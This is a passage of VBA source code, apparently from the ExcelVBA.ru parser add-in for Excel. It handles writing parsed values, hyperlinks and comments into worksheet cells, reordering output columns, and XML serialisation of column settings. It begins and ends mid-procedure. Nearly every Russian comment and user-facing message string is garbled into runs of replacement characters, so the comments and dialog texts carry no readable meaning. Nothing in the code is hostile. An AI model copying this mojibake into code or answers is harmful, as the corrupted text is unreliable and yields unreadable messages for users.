            ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|,
            ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HyperlinkTextToDisplay
            URL$ = txt
            CellText$ = Render(Me.Format.HyperlinkTextToDisplay)
        End If
    End If
    
    Const HyperlinkCode$ = "!Hyperlink="
    If txt Like "*" & HyperlinkCode$ & "*" Then
        URL$ = "": CellText$ = ""
        URL$ = Split(txt, HyperlinkCode$)(1)
        CellText$ = Split(txt, HyperlinkCode$)(0)
        txt = Split(txt, HyperlinkCode$)(0)
        If Len(URL$) Then OutputAsHyperlink = True
    End If
    
    If InStr(1, CellText$ & txt$, ARSEP, vbBinaryCompare) Then
        txt$ = Replace(txt$, ARSEP, OUTPUT_ARSEP_REPLACER$)
        CellText$ = Replace(CellText$, ARSEP, OUTPUT_ARSEP_REPLACER$)
        If Me.Parent.Parent.Options.ShowErrors Then
            AddBalloon "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| <b>" & ColumnNameByColumnNumber(Me.Column) & " '" & Me.Name & "'</b>" & vbNewLine & _
                "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| <a href='http://excelvba.ru/programmes/Parser/manuals/errors/OutputArrayIntoCell'>|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</a>" & _
                vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", bt_Attention, True
        End If
    End If
    
    With Me.Parent
        If OutputAsHyperlink And (Len(URL$) > 0) Then
            ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| url |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|
            'cell.Hyperlinks.Add cell, URL$, "", Render(Me.Format.HyperlinkScreenTip), CellText$
            .FO_SetValue CellText$, CellColumn&
            .FO_SetHyperlink Split(URL$, ARSEP)(0) & ARSEP & Render(Me.Format.HyperlinkScreenTip), CellColumn&
        Else
            If Me.Format.HyperlinkEnable Then txt = CellText$
            If v_1 = 0 Then v = txt: If HasNumericValue(v) Then v = Val(Replace(v, ",", "."))
            If (v = "empty!") Or (v = "'empty!") Then v = ""
            .FO_SetValue v, CellColumn&
        End If
        
        If Me.Format.CommentEnable Then
            If Len(Me.Format.CommentText) Then
                CommentText$ = Render(Me.Format.CommentText)
                .FO_SetComment CommentText$, CellColumn&
            End If
        End If
    End With
    
    '    If ParserVariables.Exists("OutputText_ReplaceZeroWithHyperlink") Then
    '        If (CStr(cell.Value) = "0") And (cell.Hyperlinks.Count = 1) Then cell = ParserVariables.item("OutputText_ReplaceZeroWithHyperlink")
    '    End If
    '    If ParserVariables.Exists("OutputText_ReplaceZeroWithoutHyperlink") Then
    '        If (CStr(cell.Value) = "0") And (cell.Hyperlinks.Count = 0) Then cell = ParserVariables.item("OutputText_ReplaceZeroWithoutHyperlink")
    '    End If
End Sub

Private Sub OutputToCell(ByVal txt$, ByRef cell As Range, Optional ByRef CellFormat As OutputColumnFormat)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| txt$ |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| cell
    On Error Resume Next
    Dim WrapText As Boolean, CommentText$, HL_old$, HL_new$, comm$, cuttext$, HyperlinkChanged As Boolean, v As Variant, PasteImage As Boolean
    orc& = orc& + 1: If toi& > 0 Then If (orc& Mod toi&) = 0 Then txt$ = to_RW
    
    PasteImage = CellFormat.PasteImage
    If PasteImage Then
        PasteImageIntoCell cell, txt, CellFormat.PasteImage_AuthMode, Me.Parent.Parent
        Exit Sub
    End If
    
    If Me.Format.RestoreHyperlink Then
        HL_old$ = GetCellHyperlinkAddress(cell)
        If Len(HL_old$) Then HL_new$ = HL_old$ Else If IsURL(cell.value) Then HL_new$ = cell.value
        
        If Len(HL_new$) Then        ' |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| URL |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            comm$ = Me.Format.RestoredHyperlinkChangeCommand
            If Len(comm$) Then
                ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| CutBefore=? |fffd||fffd||fffd| RunActionSet=Asetname
                Select Case True
                    Case comm$ Like "CutBefore=?*"
                        cuttext$ = Split(comm$, "=", 2)(1)
                        If InStr(1, HL_new$, cuttext$, vbTextCompare) Then HL_new$ = Split(HL_new$, cuttext$, 2)(0)
                        
                    Case comm$ Like "RunActionSet=?*"
                        ' |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                End Select
            End If
            
            
            If cell.MergeArea.Hyperlinks.Count = 0 Then HL_old$ = ""
            If (Len(HL_new$) > 0) And (HL_old$ <> HL_new$) Then
                ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|), - |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                cell.Hyperlinks.Add cell, HL_new$
                HyperlinkChanged = True
            End If
        End If
        Err.Clear
    End If
    
    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd|
    Dim URL$, CellText$, OutputAsHyperlink As Boolean
    If Me.Format.HyperlinkEnable Then
        OutputAsHyperlink = True
        If Len(Trim(Me.Format.HyperlinkURL)) Then
            ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| HyperlinkURL
            URL$ = Render(Trim(Me.Format.HyperlinkURL))
            
            ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| HyperlinkTextToDisplay, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            If Len(Trim(Me.Format.HyperlinkTextToDisplay)) Then
                CellText$ = Render(Me.Format.HyperlinkTextToDisplay)
            Else
                CellText$ = txt
            End If
        Else
            ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|,
            ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HyperlinkTextToDisplay
            URL$ = txt
            CellText$ = Render(Me.Format.HyperlinkTextToDisplay)
        End If
    End If
    
    Const HyperlinkCode$ = "!Hyperlink="
    If txt Like "*" & HyperlinkCode$ & "*" Then
        URL$ = "": CellText$ = ""
        URL$ = Split(txt, HyperlinkCode$)(1)
        CellText$ = Split(txt, HyperlinkCode$)(0)
        txt = Split(txt, HyperlinkCode$)(0)
        If Len(URL$) Then OutputAsHyperlink = True
    End If
    
    If InStr(1, CellText$ & txt$, ARSEP, vbBinaryCompare) Then
        txt$ = Replace(txt$, ARSEP, OUTPUT_ARSEP_REPLACER$)
        CellText$ = Replace(CellText$, ARSEP, OUTPUT_ARSEP_REPLACER$)
        If Me.Parent.Parent.Options.ShowErrors Then
            AddBalloon "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| <b>" & ColumnNameByColumnNumber(Me.Column) & " '" & Me.Name & "'</b>" & vbNewLine & _
                "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| <a href='http://excelvba.ru/programmes/Parser/manuals/errors/OutputArrayIntoCell'>|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</a>" & _
                vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", bt_Attention, True
        End If
    End If
    
    If OutputAsHyperlink And (Len(URL$) > 0) Then
        cell.ClearContents
        If URL Like "?*>>[A-Z]*#" Then    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|  |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|>>A1
            Dim subAddr$: subAddr$ = "'" & Replace(Split(URL, ">>")(0), "'", "''") & "'!" & Split(URL, ">>")(1)
            cell.Hyperlinks.Add cell, "", subAddr$, Render(Me.Format.HyperlinkScreenTip), CellText$
        Else    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| url |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|
            cell.Hyperlinks.Add cell, URL$, "", Render(Me.Format.HyperlinkScreenTip), CellText$
        End If
        If DESCRIPTION_MODE_FOR_ITEM Then
            PublishHTML_ShowColumnValue URL$, cell, True, Me, Render(Me.Format.HyperlinkScreenTip), CellText$
        End If
    Else
        If Not HyperlinkChanged Then If Me.Format.HyperlinkEnable Then txt = CellText$
        If v_1 = 0 Then v = txt: If HasNumericValue(v) Then v = Val(Replace(v, ",", "."))
        With cell
            WrapText = Me.Format.WrapText
            If v = "empty!" Then v = ""
            .FormulaR1C1Local = v        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            If WrapText <> .WrapText Then .WrapText = WrapText
        End With
        If DESCRIPTION_MODE_FOR_ITEM Then PublishHTML_ShowColumnValue CStr(v), cell, False, Me
    End If
    
    If Me.Format.CommentEnable Then
        cell.Comment.Delete
        If Len(Me.Format.CommentText) Then
            CommentText$ = Render(Me.Format.CommentText)
            If Len(CommentText$) Then
                cell.AddComment CommentText$
                cell.Comment.Shape.TextFrame.AutoSize = True
            End If
        End If
    End If
    
    If ParserVariables.Exists("OutputText_ReplaceZeroWithHyperlink") Then
        If (CStr(cell.value) = "0") And (cell.Hyperlinks.Count = 1) Then cell = ParserVariables.item("OutputText_ReplaceZeroWithHyperlink")
    End If
    If ParserVariables.Exists("OutputText_ReplaceZeroWithoutHyperlink") Then
        If (CStr(cell.value) = "0") And (cell.Hyperlinks.Count = 0) Then cell = ParserVariables.item("OutputText_ReplaceZeroWithoutHyperlink")
    End If
End Sub

Function HasNumericValue(ByVal txt) As Boolean
    On Error Resume Next
    If Left(txt, 1) = "-" Then txt = Mid(txt, 2)
    If (Len(txt) > 2) And (Len(txt) < 15) Then
        If txt Like "#" & Replace(String(Len(txt) - 2, "#"), "#", "[0-9,.]") & "#" Then
            If Len(txt) - Len(Replace(Replace(txt, ",", ""), ".", "")) <= 1 Then HasNumericValue = True
        End If
    End If
End Function

Function GetNextFreeColumnNumber(Optional ByVal FirstFreeColumn As Boolean = True) As Long
    On Error Resume Next
    If FirstFreeColumn Then
        Dim arr: arr = GetFreeColumnsList
        GetNextFreeColumnNumber = Val(arr(1, 1)): Erase arr
    Else
        ' new version
        Dim OC As OutputColumn, MaxCol&
        For Each OC In Me.Parent.Items
            If Not OC Is Me Then If OC.Column > MaxCol& Then If OC.OutputEnabled Then MaxCol& = OC.Column
        Next
        GetNextFreeColumnNumber = MaxCol& + 1
    End If
End Function

Function GetFreeColumnsList(Optional ByVal AllColumns As Boolean = False) As Variant
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
    ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 1 |fffd||fffd| 256, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|,
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Items, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)
    On Error Resume Next
    Dim coll As New Collection, OC As OutputColumn, i&, j&, arr, MaxColumn&
    MaxColumn& = Application.max(256, SETT.GetNumber("MAX_COLUMN", 256))
    If Not AllColumns Then
        For Each OC In Me.Parent.Items
            If Not OC Is Me Then coll.Add 1, CStr(OC.Column)
        Next
    End If
    
    ReDim arr(1 To MaxColumn& - coll.Count, 1 To 1)
    For i = 1 To MaxColumn&
        Err.Clear: coll.Add 1, CStr(i)
        If Err = 0 Then j = j + 1: arr(j, 1) = ColumnNameByColumnNumber(i)
    Next
    GetFreeColumnsList = arr
    Set coll = Nothing: Set OC = Nothing: Erase arr
End Function

Function MoveUp() As OutputColumn
    On Error Resume Next
    If Me.Parent Is Nothing Then MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| MoveUp": Exit Function
    If Me.Index <= 1 Then Set MoveUp = Me: Exit Function
    
    Set MoveUp = Me
    Err.Clear: Me.Parent.Items.Add MoveUp, , Me.Index - 1
    If Err = 0 Then Me.Parent.DeleteItem Me.Index + 1
End Function

Function MoveDown() As OutputColumn
    On Error Resume Next
    If Me.Parent Is Nothing Then MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| MoveDown": Exit Function
    If Me.Parent.Items.Count <= Me.Index Then Set MoveDown = Me: Exit Function
    
    Me.Parent.GetItemByIndex(Me.Index + 1).MoveUp        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|. |fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Set MoveDown = Me.Parent.GetItemByIndex(Me.Index)
End Function

Function ExportToXML() As IXMLDOMElement
    On Error Resume Next
    Dim XML As DOMDocument, node As IXMLDOMElement
    Set XML = CreateObject("Microsoft.XMLDOM")
    With XML
        .preserveWhiteSpace = True
        Set node = .appendChild(XML.createElement(XML_NODE_NAME$))
        With node
            .Attributes.setNamedItem(XML.createAttribute("Enabled")).text = Abs(CInt(Me.Enabled))
            .Attributes.setNamedItem(XML.createAttribute("OutputEnabled")).text = Abs(CInt(Me.OutputEnabled))
            .Attributes.setNamedItem(XML.createAttribute("Index")).text = Me.Index
            
            If Me.DynamicColumns Then .Attributes.setNamedItem(XML.createAttribute("Dynamic")).text = Abs(CInt(Me.DynamicColumns))
            .Attributes.setNamedItem(XML.createAttribute("ColumnNumber")).text = Me.Column
            .Attributes.setNamedItem(XML.createAttribute("Name")).text = Me.Name
            
            If Me.MulticolumnEnabled Or (Me.MulticolumnStep > 1) Then
                With .appendChild(XML.createElement("Multicolumn"))
                    .Attributes.setNamedItem(XML.createAttribute("Enabled")).text = Abs(CInt(Me.MulticolumnEnabled))
                    .Attributes.setNamedItem(XML.createAttribute("Step")).text = Me.MulticolumnStep
                    With .appendChild(XML.createElement("MulticolumnHeaders"))
                        '.Attributes.setNamedItem(XML.createAttribute("Enabled")).text = Abs(CInt(Me.MulticolumnHeadersEnabled))
                        .Attributes.setNamedItem(XML.createAttribute("Count")).text = Me.MulticolumnHeadersCount
                        .Attributes.setNamedItem(XML.createAttribute("SuffixEnabled")).text = Abs(CInt(Me.MulticolumnHeadersSuffixEnabled))
                        .Attributes.setNamedItem(XML.createAttribute("SuffixValue")).text = Me.MulticolumnHeadersSuffixValue
                    End With
                End With
            End If
            
            .appendChild Me.Format.ExportToXML
            If Me.Actions.Items.Count Then .appendChild Me.Actions.ExportToXML
        End With
    End With
    Set ExportToXML = node
    Set node = Nothing: Set XML = Nothing
End Function

Sub LoadFromXML(ByVal node As IXMLDOMElement)
    On Error Resume Next
    If node Is Nothing Then Exit Sub
    If node.BaseName <> XML_NODE_NAME$ Then
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| XML", vbCritical, "node.baseName <> |fffd|" & XML_NODE_NAME$ & "|fffd|"
        Exit Sub
    End If
    
    With node
        Me.Enabled = CBool(Val(.Attributes.getNamedItem("Enabled").text))
        Me.OutputEnabled = CBool(Val(.Attributes.getNamedItem("OutputEnabled").text))
        Me.Index = Val(.Attributes.getNamedItem("Index").text)
        Me.Column = Val(.Attributes.getNamedItem("ColumnNumber").text)
        Me.Name = .Attributes.getNamedItem("Name").text
        Me.DynamicColumns = CBool(Val(.Attributes.getNamedItem("Dynamic").text))
        
        With .SelectSingleNode("Multicolumn")
            Me.MulticolumnEnabled = CBool(Val(.Attributes.getNamedItem("Enabled").text))
            Me.MulticolumnStep = Val(.Attributes.getNamedItem("Step").text)
            If Me.MulticolumnStep <= 0 Then Me.MulticolumnStep = 1
            With .SelectSingleNode("MulticolumnHeaders")
                'Me.MulticolumnHeadersEnabled = CBool(Val(.Attributes.getNamedItem("Enabled").text))
                Me.MulticolumnHeadersCount = Val(.Attributes.getNamedItem("Count").text)
                If Me.MulticolumnHeadersCount <= 1 Then Me.MulticolumnHeadersCount = 2
                Me.MulticolumnHeadersSuffixEnabled = CBool(Val(.Attributes.getNamedItem("SuffixEnabled").text))
                Me.MulticolumnHeadersSuffixValue = .Attributes.getNamedItem("SuffixValue").text
            End With
        End With
        
        Set Me.Format = New OutputColumnFormat
        Me.Format.LoadFromXML .SelectSingleNode("Format")
        Set Me.Format.Parent = Me
        
        Set Me.Actions = New ArrayActions
        Me.Actions.LoadFromXML .SelectSingleNode("Actions")
        Set Me.Actions.ParentParser = Me.Parent.Parent
    End With
End Sub

Function ExportToResourceFile(Optional ByVal RF_name$) As Boolean
    ExportToResourceFile = ExportObject(RF_name$, "Column", Me)
End Function

Function GetColumnInfoForListbox() As String
    On Error Resume Next
    Dim colText$
    With Me
        colText$ = ColumnNameByColumnNumber(.Column)
        If .Parent.AutoOrder Then
            If .Enabled And .OutputEnabled Then
                GetColumnInfoForListbox = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & colText$
                If .DynamicColumns Then GetColumnInfoForListbox = colText$ & " |fffd| |fffd||fffd||fffd||fffd||fffd| ..."
            Else
                GetColumnInfoForListbox = "<|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|>"
            End If
        Else
            If .Enabled Then
                If .OutputEnabled Then
                    GetColumnInfoForListbox = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & colText$
                    If .DynamicColumns Then GetColumnInfoForListbox = colText$ & " |fffd| |fffd||fffd||fffd||fffd||fffd| ..."
                Else
                    GetColumnInfoForListbox = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| {" & .Column & "}"
                End If
            Else
                GetColumnInfoForListbox = colText$ & " <|fffd||fffd||fffd||fffd|.>"
            End If
        End If
    End With
End Function

Attribute VB_Name = "OutputColumnFormat"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : OutputColumnFormat                    Version: 2
' Author        : Igor Vakhnenko                   Date: 20.07.2018
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text
Option Explicit

Const XML_NODE_NAME$ = "Format"
Public Parent As OutputColumn

Public HyperlinkURL As String
Public HyperlinkTextToDisplay As String
Public HyperlinkScreenTip As String
Public HyperlinkEnable As Boolean

Public RestoreHyperlink As Boolean        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
Public RestoredHyperlinkChangeCommand As String        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| CutBefore=? |fffd||fffd||fffd| RunActionSet=Asetname

Public CommentText As String
Public CommentEnable As Boolean

Public HeaderColor As Long ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|

Public WrapText As Boolean
Public HorizontalAlignment As Long        ' (0 - auto, 1 - left, 2 - center, 3 - right)
Public ColumnWidth As Single        ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

Public PasteImage As Boolean    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
Public PasteImage_AuthMode As Boolean    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| WinHTTP


Private Sub Class_Initialize()
    Me.ColumnWidth = DEFAULT_COLUMN_WIDTH
    Me.HeaderColor = DEFAULT_COLUMN_HEADER_COLOR
End Sub

Private Sub Class_Terminate()
    Set Parent = Nothing
End Sub

Sub LoadFormatFromRow(ByRef RO As Range)
    On Error Resume Next
    Dim cell As Range: Set cell = RO.EntireRow.Cells(Me.Parent.Column)
    If cell Is Nothing Then Exit Sub

    Me.WrapText = cell.WrapText

    Me.ColumnWidth = Round(cell.EntireColumn.ColumnWidth * 2, 0) / 2
    If cell.EntireColumn.Hidden Then Me.ColumnWidth = 0
End Sub

Function ExportToXML() As IXMLDOMElement
    On Error Resume Next
    Dim XML As DOMDocument, node As IXMLDOMElement
    Set XML = CreateObject("Microsoft.XMLDOM")
    With XML
        .preserveWhiteSpace = True
        Set node = .appendChild(XML.createElement(XML_NODE_NAME$))

        With node
            If Me.ColumnWidth <> DEFAULT_COLUMN_WIDTH Then .appendChild(XML.createElement("ColumnWidth")).text = Round(Me.ColumnWidth, 1)
            If Me.WrapText Then .appendChild(XML.createElement("WrapText")).text = Abs(CInt(Me.WrapText))
            If Me.PasteImage Then
                With .appendChild(XML.createElement("PasteImage"))
                    .text = Abs(CInt(Me.PasteImage))
                    .Attributes.setNamedItem(XML.createAttribute("AuthMode")).text = Abs(CInt(Me.PasteImage_AuthMode))
                End With
            End If
            If Me.HorizontalAlignment Then .appendChild(XML.createElement("HAlign")).text = Me.HorizontalAlignment
            If Me.HeaderColor <> DEFAULT_COLUMN_HEADER_COLOR Then .appendChild(XML.createElement("HeaderColor")).text = Me.HeaderColor
        End With

        If Me.HyperlinkEnable - Len(Me.HyperlinkURL) - Len(Me.HyperlinkScreenTip) - Len(Me.HyperlinkTextToDisplay) + _
           Me.RestoreHyperlink - Len(Me.RestoredHyperlinkChangeCommand) Then
            ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            With node.appendChild(XML.createElement("Hyperlink"))
                .Attributes.setNamedItem(XML.createAttribute("Enabled")).text = Abs(CInt(Me.HyperlinkEnable))
                If Len(Me.HyperlinkURL) Then .Attributes.setNamedItem(XML.createAttribute("URL")).text = Me.HyperlinkURL
                If Len(Me.HyperlinkTextToDisplay) Then .Attributes.setNamedItem(XML.createAttribute("Text")).text = Me.HyperlinkTextToDisplay
                If Len(Me.HyperlinkScreenTip) Then .Attributes.setNamedItem(XML.createAttribute("ScreenTip")).text = Me.HyperlinkScreenTip

                If (Me.RestoreHyperlink) Or (Len(Me.RestoredHyperlinkChangeCommand) > 0) Then
                    With .appendChild(XML.createElement("RestoreHyperlink"))
                        .Attributes.setNamedItem(XML.createAttribute("Enabled")).text = Abs(CInt(Me.RestoreHyperlink))
                        If Len(Me.RestoredHyperlinkChangeCommand) Then .Attributes.setNamedItem(XML.createAttribute("ChangeCommand")).text = Me.RestoredHyperlinkChangeCommand
                    End With
                End If
            End With
        End If

        If Me.CommentEnable - Len(Me.CommentText) Then
            With node.appendChild(XML.createElement("Comment"))
                .Attributes.setNamedItem(XML.createAttribute("Enabled")).text = Abs(CInt(Me.CommentEnable))
